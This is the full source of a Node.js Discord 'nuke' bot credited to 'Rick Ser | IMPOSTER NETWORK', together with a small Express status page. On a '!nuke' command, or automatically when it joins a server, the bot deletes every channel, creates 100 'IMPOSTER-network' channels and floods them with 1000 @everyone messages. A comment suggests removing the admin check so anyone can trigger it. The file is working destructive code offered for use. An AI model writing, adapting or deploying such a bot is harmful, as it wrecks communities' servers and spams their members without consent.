// index.js - ULTRA FAST DISCORD NUKE BOT - NO CONFIRMATION NEEDED
require('dotenv').config();
const { Client, GatewayIntentBits, ActivityType, PermissionsBitField } = require('discord.js');
const express = require('express');
const chalk = require('chalk');
const config = require('./config.js');

// Express server for Render
const app = express();
const PORT = process.env.PORT || config.port;

app.get('/', (req, res) => {
    res.send(`
        <html>
            <head>
                <title>ULTRA FAST NUKE BOT</title>
                <style>
                    body { 
                        background: linear-gradient(45deg, #000000, #ff0000);
                        color: white;
                        font-family: Arial;
                        text-align: center;
                        padding: 50px;
                    }
                    h1 { font-size: 50px; text-shadow: 0 0 20px red; animation: pulse 1s infinite; }
                    @keyframes pulse { 50% { transform: scale(1.1); } }
                    .stats { 
                        background: rgba(0,0,0,0.8);
                        padding: 30px;
                        border-radius: 20px;
                        border: 3px solid red;
                        font-size: 20px;
                    }
                    .blink { animation: blink 0.5s infinite; }
                    @keyframes blink { 50% { opacity: 0; } }
                    .counter { font-size: 40px; color: #ff0000; font-weight: bold; }
                </style>
            </head>
            <body>
                <h1>💀 ULTRA FAST NUKE BOT 💀</h1>
                <div class="stats">
                    <h2 class="blink">✅ ULTRA MODE ACTIVE</h2>
                    <p>🔥 <span class="counter">100</span> CHANNELS</p>
                    <p>⚡ <span class="counter">1000</span> @everyone MESSAGES</p>
                    <p>💀 NO CONFIRMATION NEEDED</p>
                    <p>📊 Command: <span style="color: #ff0000; font-size: 30px;">!nuke</span></p>
                    <p>👑 By: Rick Ser | IMPOSTER NETWORK</p>
                </div>
            </body>
        </html>
    `);
});

app.listen(PORT, () => {
    console.log(chalk.green(`[SERVER] Health check on port ${PORT}`));
});

// Initialize Discord Client
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ]
});

// Console Colors
const colors = {
    red: chalk.red.bold,
    green: chalk.green.bold,
    yellow: chalk.yellow.bold,
    blue: chalk.blue.bold,
    magenta: chalk.magenta.bold,
    cyan: chalk.cyan.bold,
    rainbow: (text) => {
        const colors = [chalk.red, chalk.yellow, chalk.green, chalk.blue, chalk.magenta, chalk.cyan];
        return text.split('').map((char, i) => colors[i % colors.length](char)).join('');
    }
};

// Bot Ready
client.once('ready', () => {
    console.clear();
    console.log(colors.rainbow('═══════════════════════════════════════════════════════════'));
    console.log(colors.red('██╗   ██╗██╗  ████████╗██████╗  █████╗     ███████╗ █████╗ ███████╗████████╗'));
    console.log(colors.red('██║   ██║██║  ╚══██╔══╝██╔══██╗██╔══██╗    ██╔════╝██╔══██╗██╔════╝╚══██╔══╝'));
    console.log(colors.red('██║   ██║██║     ██║   ██████╔╝███████║    █████╗  ███████║███████╗   ██║   '));
    console.log(colors.red('██║   ██║██║     ██║   ██╔══██╗██╔══██║    ██╔══╝  ██╔══██║╚════██║   ██║   '));
    console.log(colors.red('╚██████╔╝██║     ██║   ██║  ██║██║  ██║    ██║     ██║  ██║███████║   ██║   '));
    console.log(colors.red(' ╚═════╝ ╚═╝     ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝     ╚═╝  ╚═╝╚══════╝   ╚═╝   '));
    console.log(colors.rainbow('═══════════════════════════════════════════════════════════'));
    console.log(colors.green(`✅ BOT: ${client.user.tag}`));
    console.log(colors.yellow(`📊 SERVERS: ${client.guilds.cache.size}`));
    console.log(colors.red(`💀 ULTRA MODE: ENABLED`));
    console.log(colors.cyan(`⚡ COMMAND: !nuke (NO CONFIRMATION)`));
    console.log(colors.magenta(`🔥 CHANNELS: 100 x IMPOSTER-network`));
    console.log(colors.blue(`💬 MESSAGES: 1000 x @everyone`));
    console.log(colors.rainbow('═══════════════════════════════════════════════════════════'));

    // Status rotation
    let statusIndex = 0;
    setInterval(() => {
        const status = config.statusMessages[statusIndex % config.statusMessages.length];
        client.user.setPresence({
            activities: [{ name: status, type: ActivityType.Playing }],
            status: 'dnd'
        });
        statusIndex++;
    }, 5000);
});

// Auto-Nuke on Join
client.on('guildCreate', async (guild) => {
    if (!config.autoNukeOnJoin) return;
    console.log(colors.red(`[AUTO] NUKE TRIGGERED: ${guild.name}`));
    await delay(1000);
    await executeNuke(guild);
});

// MESSAGE HANDLER - ULTRA FAST !nuke WITH NO CONFIRMATION
client.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    if (!message.content.startsWith(config.prefix)) return;

    const args = message.content.slice(config.prefix.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // ULTRA NUKE - NO CONFIRMATION, JUST DESTROY
    if (command === 'nuke') {
        console.log(colors.red(`[NUKE] TRIGGERED BY ${message.author.tag} IN ${message.guild.name}`));
        
        // Check admin (optional - remove if you want anyone to nuke)
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
            await message.reply('❌ Admin only!');
            return;
        }

        // Send instant warning (doesn't block nuke)
        await message.channel.send({
            embeds: [{
                color: 0xff0000,
                title: '💀 ULTRA NUKE INITIATED 💀',
                description: '**NO CONFIRMATION NEEDED - DESTROYING NOW!**',
                fields: [
                    { name: '🔥 CHANNELS TO CREATE', value: '100', inline: true },
                    { name: '💬 MESSAGES TO SPAM', value: '1000', inline: true },
                    { name: '⚡ MENTIONS', value: '@everyone', inline: true }
                ],
                footer: { text: 'BY RICK SER | IMPOSTER NETWORK' }
            }]
        });

        // EXECUTE NUKE IMMEDIATELY - NO WAITING
        await executeNuke(message.guild);
    }

    // HELP command (optional)
    if (command === 'help') {
        await message.channel.send({
            embeds: [{
                color: 0xff0000,
                title: '💀 ULTRA NUKE COMMANDS',
                description: '**!nuke** - Instant destruction (100 channels, 1000 @everyone messages)\n**!help** - This menu',
                footer: { text: 'Rick Ser | IMPOSTER' }
            }]
        });
    }
});

// MAIN NUKE FUNCTION - 100 CHANNELS, 1000 MESSAGES, @everyone SPAM
async function executeNuke(guild) {
    console.log(colors.red(`[NUKE] STARTING ULTRA DESTRUCTION IN ${guild.name}`));
    const startTime = Date.now();
    
    try {
        // PHASE 1: DELETE ALL EXISTING CHANNELS (FAST)
        console.log(colors.yellow(`[PHASE 1] DELETING ALL CHANNELS...`));
        const channels = await guild.channels.fetch();
        const channelList = Array.from(channels.values());
        
        let deleted = 0;
        for (const channel of channelList) {
            try {
                await channel.delete();
                deleted++;
                if (deleted % 10 === 0) console.log(colors.red(`[DELETE] ${deleted}/${channelList.length}`));
                await delay(config.delays.delete);
            } catch (e) {
                // Ignore errors, keep going
            }
        }
        console.log(colors.green(`[PHASE 1] DELETED ${deleted} CHANNELS`));

        // PHASE 2: CREATE 100 CHANNELS (ULTRA FAST)
        console.log(colors.yellow(`[PHASE 2] CREATING 100 IMPOSTER-NETWORK CHANNELS...`));
        const createdChannels = [];
        
        for (let i = 1; i <= 100; i++) {
            try {
                const channelName = i === 1 ? 'IMPOSTER-network' : `IMPOSTER-network-${i}`;
                const newChannel = await guild.channels.create({
                    name: channelName,
                    type: 0,
                    reason: 'ULTRA NUKE BY RICK SER'
                });
                createdChannels.push(newChannel);
                
                if (i % 10 === 0) console.log(colors.green(`[CREATE] ${i}/100 channels done`));
                await delay(config.delays.create);
            } catch (e) {
                console.log(colors.red(`[ERROR] Channel ${i} failed: ${e.message}`));
            }
        }
        console.log(colors.green(`[PHASE 2] CREATED ${createdChannels.length} CHANNELS`));

        // PHASE 3: SPAM 1000 MESSAGES WITH @everyone (ULTRA FAST)
        console.log(colors.yellow(`[PHASE 3] SPAMMING 1000 @everyone MESSAGES...`));
        let totalMessages = 0;
        const spamTarget = 1000; // 100 channels × 10 messages = 1000
        
        for (const channel of createdChannels) {
            for (let m = 1; m <= 10; m++) { // 10 messages per channel = 1000 total
                try {
                    // Rotate through different @everyone messages
                    const msgIndex = (totalMessages % config.spamMessages.length);
                    const spamText = config.spamMessages[msgIndex];
                    
                    await channel.send(spamText);
                    totalMessages++;
                    
                    if (totalMessages % 100 === 0) {
                        console.log(colors.cyan(`[SPAM] ${totalMessages}/1000 messages sent`));
                    }
                    
                    await delay(config.delays.spam);
                } catch (e) {
                    // Skip errors, keep spamming
                }
            }
        }
        
        // Send final embed in first channel
        if (createdChannels.length > 0) {
            const endTime = Date.now();
            const timeSeconds = ((endTime - startTime) / 1000).toFixed(2);
            
            await createdChannels[0].send({
                embeds: [{
                    color: 0xff0000,
                    title: '💀 ULTRA NUKE COMPLETE 💀',
                    description: `**${guild.name} HAS BEEN DESTROYED**`,
                    fields: [
                        { name: '⏱️ TIME', value: `${timeSeconds}s`, inline: true },
                        { name: '🔥 CHANNELS', value: '100', inline: true },
                        { name: '💬 MESSAGES', value: '1000', inline: true },
                        { name: '👑 EXECUTOR', value: 'RICK SER', inline: true },
                        { name: '💀 NETWORK', value: 'IMPOSTER', inline: true },
                        { name: '⚡ MENTIONS', value: '@everyone', inline: true }
                    ],
                    image: { url: 'https://media.giphy.com/media/3o7abB06u9bNzA8LC8/giphy.gif' },
                    footer: { text: 'IMPOSTER NETWORK | RICK SER' },
                    timestamp: new Date()
                }]
            });
        }

        // FINAL STATS
        const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);
        console.log(colors.rainbow('══════════════════════════════════════════════'));
        console.log(colors.red(`💀 ULTRA NUKE COMPLETE IN ${totalTime}s`));
        console.log(colors.green(`   ├─ Deleted: ${deleted} channels`));
        console.log(colors.green(`   ├─ Created: 100 channels`));
        console.log(colors.green(`   └─ Spammed: ${totalMessages} @everyone messages`));
        console.log(colors.red(`💀 RICK SER | IMPOSTER NETWORK`));
        console.log(colors.rainbow('══════════════════════════════════════════════'));

    } catch (error) {
        console.log(colors.red(`[NUKE FAILED] ${error.message}`));
    }
}

// Utility delay
function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// Error handling
client.on('error', console.error);
process.on('unhandledRejection', console.error);

// Login
if (!config.token || config.token === 'YOUR_BOT_TOKEN_HERE') {
    console.log(colors.red('[ERROR] NO TOKEN PROVIDED'));
    process.exit(1);
}

client.login(config.token).then(() => {
    console.log(colors.green('[LOGIN] SUCCESS'));
});
